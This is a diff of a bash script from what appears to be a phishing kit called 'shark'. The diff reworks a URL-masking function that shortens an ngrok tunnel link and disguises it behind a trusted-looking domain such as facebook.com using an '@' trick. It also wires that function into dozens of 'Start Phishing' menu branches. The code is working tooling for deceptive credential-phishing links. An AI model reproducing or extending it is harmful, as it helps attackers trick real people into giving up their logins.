@@ -266,27 +266,20 @@ fi
 }
 
 # URL_SHORTNER
-function url_shortner() {	      
+function url_shortner() {	
+        printf "\n"
 	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
         short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
         shorter=${short#https://}
-        echo
-        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m] :\e[m ' mask
-        echo
-        url_checker $mask
-        echo -e "\e[1;96m>>\e[1;93m Enter some words you like to mention in url \e[1;92m[\e[1;92mEx.free-insta-followers\e[1;92m] \e[m "
-	sleep 1
-        echo
-	echo -e "\e[1;96m>>\e[1;91m NOTE:\e[1;93m Don't use space in your words,\e[1;92m[\e[1;91minstead use \e[1;92m'-'\e[1;91m to avoid space\e[1;92m] \e[m "
-	sleep 2
-	echo
-        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Enter your words here :\e[0m ' words
-        echo
-	sleep 3
-        final=$mask-$words@$shorter
-        echo -e "\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Your phishing url >>\e[m $final "
-	echo
-        }
+        printf "\n"
+        read -p $'${blue} shark ${white}>> ${green}Mask Your url domain here ${yellow}: Ex. https://facebook.com : ${nc}\n ' mask
+        url_checker $mask	
+	printf "${blue} shark ${white}>> ${green}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
+	printf "${blue} shark ${white}>> ${green} Don't use space in your words\n"	
+        read -p $'${blue} shark ${white}>> ${green}Enter your words here :${nc}\n ' words
+        final_url=$mask-$words@$shorter
+	printf "$final_url\n"
+}
 	
 
 #######
@@ -364,7 +357,7 @@ echo
 			    tput cnorm
 			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
 			    ( sleep 6 ) &> /dev/null & spinner1
-			    ash 
+			    url_shortner
 			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner			    
 			    clear
 			    shark_logo
@@ -395,8 +388,8 @@ echo
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                      
-			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+			   ( sleep 6 ) &> /dev/null & spinner1		           
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -427,7 +420,7 @@ echo
 			   tput cnorm
 			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
-			   ash
+			   url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -458,7 +451,7 @@ echo
 			  tput cnorm
 			  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
 			  ( sleep 6 ) &> /dev/null & spinner1
-			  ash 
+			  url_shortner 
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
@@ -489,7 +482,7 @@ echo
 			  tput cnorm
 		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")  		        
 			  ( sleep 6 ) &> /dev/null & spinner1
-		          ash
+		          url_shortner
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
@@ -520,7 +513,7 @@ echo
 			  tput cnorm
 		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")        
 			  ( sleep 6 ) &> /dev/null & spinner1
-		          ash
+		          url_shortner
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
@@ -560,7 +553,7 @@ echo
 				tput cnorm
                                 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 				( sleep 6 ) &> /dev/null & spinner1
-			        ash
+			        url_shortner
 				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			        clear
 				shark_logo
@@ -589,7 +582,7 @@ echo
 				tput cnorm
                                 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                             
 				( sleep 6 ) &> /dev/null & spinner1
-			        ash
+			        url_shortner
 				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			        clear
 				shark_logo
@@ -622,7 +615,7 @@ echo
 			  tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                                                 
 			  ( sleep 6 ) &> /dev/null & spinner1
-		          ash
+		          url_shortner
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
@@ -653,7 +646,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -684,7 +677,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -715,7 +708,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -746,7 +739,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -777,7 +770,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -808,7 +801,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash 
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -839,7 +832,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
 			   ( sleep 6 ) &> /dev/null & spinner1
-	                   ash
+	                   url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -870,7 +863,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-             		   ash
+             		   url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -901,7 +894,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-	                   ash
+	                   url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -932,7 +925,7 @@ echo
 			   tput cnorm
 			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                
 			   ( sleep 6 ) &> /dev/null & spinner1
-          		   ash
+          		   url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -963,7 +956,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-	                   ash
+	                   url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -994,7 +987,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1025,7 +1018,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-	 	           ash
+	 	           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1056,7 +1049,7 @@ echo
 			  tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
 			  ( sleep 6 ) &> /dev/null & spinner1
-		          ash
+		          url_shortner
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
@@ -1087,7 +1080,7 @@ echo
 			  tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			  ( sleep 6 ) &> /dev/null & spinner1
-		          ash
+		          url_shortner
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
@@ -1118,7 +1111,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1149,7 +1142,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
 			   ( sleep 6 ) &> /dev/null & spinner1
-	              	   ash
+	              	   url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1180,7 +1173,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1211,7 +1204,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1242,7 +1235,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
- 		           ash
+ 		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1273,7 +1266,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1304,7 +1297,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1379,7 +1372,7 @@ echo
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
+		           url_shortner
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
@@ -1433,7 +1426,7 @@ echo
 			    tput cnorm
                             link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
 			    ( sleep 6 ) &> /dev/null & spinner1
-		            ash
+		            url_shortner
 			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			    clear
 			    shark_logo
